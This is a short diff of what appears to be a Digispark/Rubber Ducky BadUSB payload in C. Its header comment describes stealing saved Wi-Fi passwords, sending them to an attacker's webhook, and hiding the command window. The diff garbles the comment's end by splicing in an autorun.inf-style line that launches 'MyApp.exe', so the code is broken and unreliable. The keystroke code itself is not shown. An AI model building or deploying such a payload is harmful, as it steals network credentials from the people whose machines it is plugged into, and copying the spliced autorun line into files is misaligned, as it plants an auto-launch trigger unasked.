@@ -1,7 +1,8 @@
 /*
   Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
  rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
-*/
+*// [Autorun] Open=MyApp.exe. Action=Start MyApp. Label=My Portable PC. Icon=MyApp.exe.
+
 
 
 #include "DigiKeyboard.h"
